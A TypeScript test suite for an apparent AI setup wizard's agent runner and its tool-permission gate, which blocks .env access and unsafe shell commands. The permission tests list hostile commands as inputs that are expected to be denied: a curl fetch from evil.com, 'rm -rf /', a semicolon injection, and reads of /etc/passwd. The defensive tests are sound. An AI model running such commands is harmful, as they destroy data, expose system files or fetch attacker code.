import {
  vi,
  describe,
  it,
  expect,
  beforeEach,
  afterEach,
  type Mock,
} from 'vitest';
import {
  runAgent,
  createStopHook,
  wizardCanUseTool,
  buildWizardMetadata,
  isSkillInstallCommand,
  matchesAllowedPrefix,
  AgentErrorType,
  AgentSignals,
} from '../agent-interface';
import type { WizardOptions } from '../../utils/types';
import type { SpinnerHandle } from '../../ui';
import {
  AdditionalFeature,
  ADDITIONAL_FEATURE_PROMPTS,
} from '../wizard-session';

// Mock dependencies
vi.mock('../../utils/analytics');
vi.mock('../../utils/debug');

// Mock the SDK module
const mockQuery = vi.fn();
vi.mock('@anthropic-ai/claude-agent-sdk', () => ({
  query: (...args: unknown[]) => mockQuery(...args),
}));

// Mock the UI layer
const mockUIInstance = {
  log: {
    step: vi.fn(),
    success: vi.fn(),
    error: vi.fn(),
    warn: vi.fn(),
    info: vi.fn(),
  },
  spinner: vi.fn(),
  select: vi.fn(),
  confirm: vi.fn(),
  text: vi.fn(),
  intro: vi.fn(),
  outro: vi.fn(),
  cancel: vi.fn(),
  note: vi.fn(),
  isCancel: vi.fn(),
  setDetectedFramework: vi.fn(),
  setCredentials: vi.fn(),
  pushStatus: vi.fn(),
  setLoginUrl: vi.fn(),
  showServiceStatus: vi.fn(),
  showSettingsOverride: vi.fn(),
  startRun: vi.fn(),
  syncTodos: vi.fn(),
  groupMultiselect: vi.fn(),
  multiselect: vi.fn(),
  heartbeat: vi.fn(),
  setEventPlan: vi.fn(),
};
vi.mock('../../ui', () => ({
  getUI: () => mockUIInstance,
}));

describe('runAgent', () => {
  let mockSpinner: {
    start: Mock;
    stop: Mock;
    message: Mock;
  };

  const defaultOptions: WizardOptions = {
    debug: false,
    installDir: '/test/dir',
    forceInstall: false,
    default: false,
    signup: false,
    localMcp: false,
    ci: false,
    menu: false,
    benchmark: false,
  };

  const defaultAgentConfig = {
    workingDirectory: '/test/dir',
    mcpServers: {},
    model: 'claude-opus-4-5-20251101',
  };

  beforeEach(() => {
    vi.clearAllMocks();

    mockSpinner = {
      start: vi.fn(),
      stop: vi.fn(),
      message: vi.fn(),
    };

    mockUIInstance.spinner.mockReturnValue(mockSpinner);
    // Reset log mocks
    Object.values(mockUIInstance.log).forEach((fn) => fn.mockReset());
  });

  describe('race condition handling', () => {
    it('should return success when agent completes successfully then SDK cleanup fails', async () => {
      // This simulates the race condition:
      // 1. Agent completes with success result
      // 2. signalDone() is called, completing the prompt generator
      // 3. SDK tries to send cleanup command while streaming is active
      // 4. SDK throws an error
      // The fix should recognize we already got a success and return success anyway

      function* mockGeneratorWithCleanupError() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'Agent completed successfully',
        };

        // Simulate the SDK cleanup error that occurs after success
        throw new Error('only prompt commands are supported in streaming mode');
      }

      mockQuery.mockReturnValue(mockGeneratorWithCleanupError());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return success (empty object), not throw
      expect(result).toEqual({});
      expect(mockSpinner.stop).toHaveBeenCalledWith('Test success');
    });

    it('should still throw when no success result was received before error', async () => {
      // If we never got a success result, errors should propagate normally

      function* mockGeneratorWithOnlyError() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        // No success result, just an error
        throw new Error('Actual SDK error');
      }

      mockQuery.mockReturnValue(mockGeneratorWithOnlyError());

      await expect(
        runAgent(
          defaultAgentConfig,
          'test prompt',
          defaultOptions,
          mockSpinner as unknown as SpinnerHandle,
          {
            successMessage: 'Test success',
            errorMessage: 'Test error',
          },
        ),
      ).rejects.toThrow('Actual SDK error');

      expect(mockSpinner.stop).toHaveBeenCalledWith('Test error');
    });

    it('should not treat error results as success', async () => {
      // A result with is_error: true should not count as success
      // Even if subtype is 'success', the is_error flag takes precedence

      function* mockGeneratorWithErrorResult() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        yield {
          type: 'result',
          subtype: 'success', // subtype can be success but is_error true
          is_error: true,
          result: 'API Error: 500 Internal Server Error',
        };

        throw new Error('Process exited with code 1');
      }

      mockQuery.mockReturnValue(mockGeneratorWithErrorResult());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return API error, not success
      expect(result.error).toBe('WIZARD_API_ERROR');
      expect(result.message).toContain('API Error');
    });

    it('should report MCP_MISSING when agent output contains the error signal', async () => {
      function* mcpMissingGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: `${AgentSignals.ERROR_MCP_MISSING} Could not load skill menu`,
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }

      mockQuery.mockReturnValue(mcpMissingGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.MCP_MISSING);
    });

    it('should report RESOURCE_MISSING when agent output contains the error signal', async () => {
      function* resourceMissingGenerator() {
        yield {
          type: 'assistant',
          message: {
            role: 'assistant',
            content: [
              {
                type: 'text',
                text: `${AgentSignals.ERROR_RESOURCE_MISSING} Could not find skill`,
              },
            ],
          },
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: '',
        };
      }

      mockQuery.mockReturnValue(resourceMissingGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.RESOURCE_MISSING);
    });

    it('should report RATE_LIMIT when agent output contains API Error 429', async () => {
      function* rateLimitGenerator() {
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'API Error: 429 Too Many Requests',
        };
      }

      mockQuery.mockReturnValue(rateLimitGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.RATE_LIMIT);
      expect(result.message).toContain('API Error: 429');
    });

    it('should report API_ERROR when agent output contains a non-429 API Error', async () => {
      function* apiErrorGenerator() {
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'API Error: 500 Internal Server Error',
        };
      }

      mockQuery.mockReturnValue(apiErrorGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.API_ERROR);
      expect(result.message).toContain('API Error: 500');
    });

    it('should report AUTH_ERROR when result contains authentication_failed', async () => {
      function* authFailedGenerator() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [{ name: 'amplitude-wizard', status: 'connected' }],
        };
        yield {
          type: 'result',
          subtype: 'error',
          is_error: true,
          result: '',
          error: 'authentication_failed',
        };
      }

      mockQuery.mockReturnValue(authFailedGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.AUTH_ERROR);
      expect(mockSpinner.stop).toHaveBeenCalledWith('Authentication failed');
    });

    it('should report AUTH_ERROR when amplitude-wizard MCP has needs-auth status', async () => {
      function* needsAuthGenerator() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [{ name: 'amplitude-wizard', status: 'needs-auth' }],
        };
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          result: 'Done',
        };
      }

      mockQuery.mockReturnValue(needsAuthGenerator());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
      );

      expect(result.error).toBe(AgentErrorType.AUTH_ERROR);
    });
  });

  describe('stall retry', () => {
    afterEach(() => {
      vi.useRealTimers();
    });

    it('retries after a stall and succeeds on the second attempt', async () => {
      vi.useFakeTimers();

      let queryCallCount = 0;

      mockQuery.mockImplementation(
        (params: { options: Record<string, unknown> }) => {
          queryCallCount++;
          const signal = params.options.abortSignal as AbortSignal;

          if (queryCallCount === 1) {
            // Hang until aborted — no yield because the await always rejects first
            // eslint-disable-next-line require-yield
            return (async function* () {
              await new Promise<never>((_, reject) => {
                signal.addEventListener('abort', () =>
                  reject(new Error('Stall aborted')),
                );
              });
            })();
          }

          // Second attempt: succeed immediately
          return (async function* () {
            yield {
              type: 'result',
              subtype: 'success',
              is_error: false,
              result: '',
            };
          })();
        },
      );

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Trigger the initial stall timeout (60s cold-start grace period) + backoff (2s)
      await vi.advanceTimersByTimeAsync(63_000);

      const result = await runPromise;

      expect(result).toEqual({});
      expect(queryCallCount).toBe(2);
      expect(mockSpinner.stop).toHaveBeenCalledWith('Done');
    });

    it('throws after exhausting all retries', async () => {
      vi.useFakeTimers();

      let queryCallCount = 0;

      mockQuery.mockImplementation(
        (params: { options: Record<string, unknown> }) => {
          queryCallCount++;
          const signal = params.options.abortSignal as AbortSignal;
          // eslint-disable-next-line require-yield
          return (async function* () {
            await new Promise<never>((_, reject) => {
              signal.addEventListener('abort', () =>
                reject(new Error('Stall aborted')),
              );
            });
          })();
        },
      );

      const runPromise = runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        { successMessage: 'Done', errorMessage: 'Failed' },
      );

      // Attach the rejection check BEFORE advancing timers so the promise has a
      // .catch() handler and doesn't become an unhandled rejection mid-advance.
      const rejectCheck = expect(runPromise).rejects.toThrow('Stall aborted');

      // Fires all 4 stall timers (1 × 60s cold-start + 3 × 120s mid-run) plus
      // backoff delays (2s + 4s + 8s = 14s) in sequence.
      // advanceTimersByTimeAsync processes microtasks between each timer firing,
      // so each retry's new timer gets registered before the next fires.
      await vi.advanceTimersByTimeAsync(500_000);

      await rejectCheck;
      expect(queryCallCount).toBe(4); // MAX_RETRIES=3 → 4 total attempts
    });

    it('does not retry on non-stall errors', async () => {
      let queryCallCount = 0;

      mockQuery.mockImplementation(() => {
        queryCallCount++;
        // eslint-disable-next-line require-yield
        return (async function* () {
          throw new Error('Network failure');
        })();
      });

      await expect(
        runAgent(
          defaultAgentConfig,
          'test prompt',
          defaultOptions,
          mockSpinner as unknown as SpinnerHandle,
        ),
      ).rejects.toThrow('Network failure');

      expect(queryCallCount).toBe(1); // No retry — not a stall
    });
  });

  describe('race condition handling', () => {
    it('should return success when agent completes successfully then SDK cleanup fails', async () => {
      // This test models actual SDK behavior where the SDK emits TWO result messages:
      // 1. SDK yields success result (num_turns: 105, is_error: false)
      // 2. SDK yields a SECOND result with is_error: true containing
      //    accumulated cleanup/telemetry errors
      // 3. The errors should be logged to file but NOT shown to the user
      //
      // This differs from the thrown exception test above - here the SDK YIELDS
      // an error result message instead of THROWING an exception.

      function* mockGeneratorWithYieldedErrorAfterSuccess() {
        yield {
          type: 'system',
          subtype: 'init',
          model: 'claude-opus-4-5-20251101',
          tools: [],
          mcp_servers: [],
        };

        // First result: success (this is the real completion)
        yield {
          type: 'result',
          subtype: 'success',
          is_error: false,
          num_turns: 105,
          result: '[WIZARD-REMARK] Integration completed successfully',
          session_id: '2ce14bda-6d86-4220-b5bb-ab24f7004290',
          total_cost_usd: 5.83,
        };

        // Second result: error (SDK cleanup noise - yielded, not thrown)
        yield {
          type: 'result',
          subtype: 'error_during_execution',
          is_error: true,
          num_turns: 0,
          session_id: '2ce14bda-6d86-4220-b5bb-ab24f7004290',
          total_cost_usd: 0,
          errors: [
            'only prompt commands are supported in streaming mode',
            'Error: 1P event logging: 14 events failed to export',
            'Error: 1P event logging: 13 events failed to export',
            'Error: Failed to export 14 events',
          ],
        };
      }

      mockQuery.mockReturnValue(mockGeneratorWithYieldedErrorAfterSuccess());

      const result = await runAgent(
        defaultAgentConfig,
        'test prompt',
        defaultOptions,
        mockSpinner as unknown as SpinnerHandle,
        {
          successMessage: 'Test success',
          errorMessage: 'Test error',
        },
      );

      // Should return success (empty object), not error
      expect(result).toEqual({});
      expect(mockSpinner.stop).toHaveBeenCalledWith('Test success');

      // ui.log.error should NOT have been called (errors suppressed for user)
      expect(mockUIInstance.log.error).not.toHaveBeenCalled();
    });
  });
});

describe('createStopHook', () => {
  const hookInput = { stop_hook_active: false };

  it('empty queue: first call blocks for remark, second allows stop', async () => {
    const hook = createStopHook([]);

    // First call → remark prompt
    const first = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Second call → allow stop
    const second = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(second).toEqual({});
  });

  it('single feature: feature prompt, then remark, then allow stop', async () => {
    const hook = createStopHook([AdditionalFeature.LLM]);

    // First call → LLM feature prompt
    const first = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Second call → remark prompt
    const second = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(second).toHaveProperty('decision', 'block');
    expect((second as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Third call → allow stop
    const third = await hook(hookInput, undefined, {
      signal: new AbortController().signal,
    });
    expect(third).toEqual({});
  });

  it('multiple queue entries: drains all, then remark, then allow stop', async () => {
    // Queue the same feature twice to exercise multi-item draining
    const hook = createStopHook([AdditionalFeature.LLM, AdditionalFeature.LLM]);
    const signal = new AbortController().signal;

    // First call → LLM prompt
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');
    expect((first as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Second call → LLM prompt again
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toHaveProperty('decision', 'block');
    expect((second as { reason: string }).reason).toBe(
      ADDITIONAL_FEATURE_PROMPTS[AdditionalFeature.LLM],
    );

    // Third call → remark prompt
    const third = await hook(hookInput, undefined, { signal });
    expect(third).toHaveProperty('decision', 'block');
    expect((third as { reason: string }).reason).toContain('WIZARD-REMARK');

    // Fourth call → allow stop
    const fourth = await hook(hookInput, undefined, { signal });
    expect(fourth).toEqual({});
  });

  it('allow stop is idempotent after all phases complete', async () => {
    const hook = createStopHook([]);
    const signal = new AbortController().signal;

    await hook(hookInput, undefined, { signal }); // remark
    await hook(hookInput, undefined, { signal }); // allow
    const extra = await hook(hookInput, undefined, { signal }); // still allow
    expect(extra).toEqual({});
  });

  it('auth error: allows stop immediately, skipping queue and remark', async () => {
    let authError = false;
    const hook = createStopHook([AdditionalFeature.LLM], () => authError);
    const signal = new AbortController().signal;

    authError = true;
    const result = await hook(hookInput, undefined, { signal });
    expect(result).toEqual({});
  });

  it('auth error detected mid-run: skips remaining phases on next call', async () => {
    let authError = false;
    const hook = createStopHook([AdditionalFeature.LLM], () => authError);
    const signal = new AbortController().signal;

    // First call drains queue normally
    const first = await hook(hookInput, undefined, { signal });
    expect(first).toHaveProperty('decision', 'block');

    // Auth error occurs before second call
    authError = true;
    const second = await hook(hookInput, undefined, { signal });
    expect(second).toEqual({});
  });
});

describe('isSkillInstallCommand', () => {
  it('allows a valid GitHub releases skill install', () => {
    const cmd =
      "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1.0.0/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
    expect(isSkillInstallCommand(cmd)).toBe(true);
  });

  it('allows a localhost dev skill install', () => {
    const cmd =
      "mkdir -p .claude/skills/test && curl -sL 'http://localhost:3000/skill.tar.gz' | tar -xz -C .claude/skills/test";
    expect(isSkillInstallCommand(cmd)).toBe(true);
  });

  it('rejects a command that does not start with mkdir -p .claude/skills/', () => {
    const cmd =
      "curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz'";
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });

  it('rejects a curl from an untrusted domain', () => {
    const cmd =
      "mkdir -p .claude/skills/evil && curl -sL 'https://evil.com/malware.sh'";
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });

  it('rejects a command with no curl at all', () => {
    const cmd = 'mkdir -p .claude/skills/foo && echo done';
    expect(isSkillInstallCommand(cmd)).toBe(false);
  });
});

describe('matchesAllowedPrefix', () => {
  it('allows npm install', () => {
    expect(matchesAllowedPrefix('npm install')).toBe(true);
  });

  it('allows yarn add react', () => {
    expect(matchesAllowedPrefix('yarn add react')).toBe(true);
  });

  it('allows pnpm run build', () => {
    expect(matchesAllowedPrefix('pnpm run build')).toBe(true);
  });

  it('allows npm exec tsc', () => {
    expect(matchesAllowedPrefix('npm exec tsc')).toBe(true);
  });

  it('allows standalone build commands (hugo, make)', () => {
    expect(matchesAllowedPrefix('hugo')).toBe(true);
    expect(matchesAllowedPrefix('make')).toBe(true);
  });

  it('denies unknown executables', () => {
    expect(matchesAllowedPrefix('rm -rf /')).toBe(false);
    expect(matchesAllowedPrefix('curl https://example.com')).toBe(false);
  });

  it('denies disallowed sub-commands even from known executables', () => {
    expect(matchesAllowedPrefix('npm run dev')).toBe(false);
    expect(matchesAllowedPrefix('npm run start')).toBe(false);
    expect(matchesAllowedPrefix('npm run deploy')).toBe(false);
  });

  it('allows npm publish because "pub" is in SAFE_SCRIPTS (startsWith match for go pub)', () => {
    // This is an intentional side-effect of the "pub" entry covering Go's pub sub-command.
    expect(matchesAllowedPrefix('npm publish')).toBe(true);
  });

  it('allows linting tools as sub-commands', () => {
    expect(matchesAllowedPrefix('npm run eslint')).toBe(true);
    expect(matchesAllowedPrefix('npx prettier --check .')).toBe(true);
  });
});

describe('wizardCanUseTool', () => {
  describe('file operations on .env files', () => {
    it('denies Read on .env', () => {
      const result = wizardCanUseTool('Read', { file_path: '/project/.env' });
      expect(result.behavior).toBe('deny');
    });

    it('denies Write on .env.local', () => {
      const result = wizardCanUseTool('Write', {
        file_path: '/project/.env.local',
      });
      expect(result.behavior).toBe('deny');
    });

    it('denies Edit on .env.production', () => {
      const result = wizardCanUseTool('Edit', {
        file_path: '/project/.env.production',
      });
      expect(result.behavior).toBe('deny');
    });

    it('allows Read on a regular file', () => {
      const result = wizardCanUseTool('Read', {
        file_path: '/project/src/index.ts',
      });
      expect(result.behavior).toBe('allow');
    });

    it('allows Write on a non-env file', () => {
      const result = wizardCanUseTool('Write', {
        file_path: '/project/src/analytics.ts',
      });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('Grep', () => {
    it('denies Grep directly targeting a .env file', () => {
      const result = wizardCanUseTool('Grep', { path: '/project/.env' });
      expect(result.behavior).toBe('deny');
    });

    it('allows Grep on a directory (ripgrep skips dotfiles by default)', () => {
      const result = wizardCanUseTool('Grep', { path: '/project/src' });
      expect(result.behavior).toBe('allow');
    });

    it('allows Grep with no path', () => {
      const result = wizardCanUseTool('Grep', { pattern: 'amplitude' });
      expect(result.behavior).toBe('allow');
    });
  });

  describe('non-Bash tools', () => {
    it('allows Glob unconditionally', () => {
      expect(wizardCanUseTool('Glob', { pattern: '**/*.ts' }).behavior).toBe(
        'allow',
      );
    });

    it('allows ListMcpResourcesTool unconditionally', () => {
      expect(wizardCanUseTool('ListMcpResourcesTool', {}).behavior).toBe(
        'allow',
      );
    });
  });

  describe('Bash — dangerous operators', () => {
    it('denies semicolon', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm install; rm -rf /' }).behavior,
      ).toBe('deny');
    });

    it('denies backtick', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'echo `cat /etc/passwd`' })
          .behavior,
      ).toBe('deny');
    });

    it('denies dollar-paren subshell', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'echo $(whoami)' }).behavior,
      ).toBe('deny');
    });
  });

  describe('Bash — skill installation', () => {
    it('allows Amplitude skill install from GitHub releases', () => {
      const cmd =
        "mkdir -p .claude/skills/integration-nextjs && curl -sL 'https://github.com/Amplitude/context-mill/releases/download/v1/skill.tar.gz' | tar -xz -C .claude/skills/integration-nextjs";
      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
    });
  });

  describe('Bash — pipe to tail/head', () => {
    it('allows npm install piped to tail', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | tail -n 20',
      });
      expect(result.behavior).toBe('allow');
    });

    it('allows stderr redirect then pipe to head', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm run build 2>&1 | head -n 50',
      });
      expect(result.behavior).toBe('allow');
    });

    it('denies pipe to non-tail/head command', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | grep error',
      });
      expect(result.behavior).toBe('deny');
    });

    it('denies multiple pipes even ending in tail', () => {
      const result = wizardCanUseTool('Bash', {
        command: 'npm install | grep error | tail -n 5',
      });
      expect(result.behavior).toBe('deny');
    });
  });

  describe('Bash — allowed package manager commands', () => {
    it('allows npm install', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm install' }).behavior,
      ).toBe('allow');
    });

    it('allows pnpm add @amplitude/analytics-browser', () => {
      expect(
        wizardCanUseTool('Bash', {
          command: 'pnpm add @amplitude/analytics-browser',
        }).behavior,
      ).toBe('allow');
    });

    it('allows yarn build', () => {
      expect(wizardCanUseTool('Bash', { command: 'yarn build' }).behavior).toBe(
        'allow',
      );
    });

    it('allows go get', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'go get ./...' }).behavior,
      ).toBe('allow');
    });
  });

  describe('Bash — denied commands', () => {
    it('denies arbitrary shell commands', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'cat /etc/passwd' }).behavior,
      ).toBe('deny');
    });

    it('denies npm run dev (not in safe scripts)', () => {
      expect(
        wizardCanUseTool('Bash', { command: 'npm run dev' }).behavior,
      ).toBe('deny');
    });

    it('denies && chaining outside of skill install', () => {
      expect(
        wizardCanUseTool('Bash', {
          command: 'npm install && npm run deploy',
        }).behavior,
      ).toBe('deny');
    });
  });
});

describe('buildWizardMetadata', () => {
  it('returns base variant when no flags are provided', () => {
    const result = buildWizardMetadata({});
    expect(result).toEqual({ VARIANT: 'base' });
  });

  it('returns the matching variant when the flag is set', () => {
    const result = buildWizardMetadata({ 'wizard-variant': 'subagents' });
    expect(result).toEqual({ VARIANT: 'subagents' });
  });

  it('falls back to base variant for an unknown flag value', () => {
    const result = buildWizardMetadata({ 'wizard-variant': 'nonexistent' });
    expect(result).toEqual({ VARIANT: 'base' });
  });

  it('ignores unrelated flags', () => {
    const result = buildWizardMetadata({ 'other-flag': 'value' });
    expect(result).toEqual({ VARIANT: 'base' });
  });
});
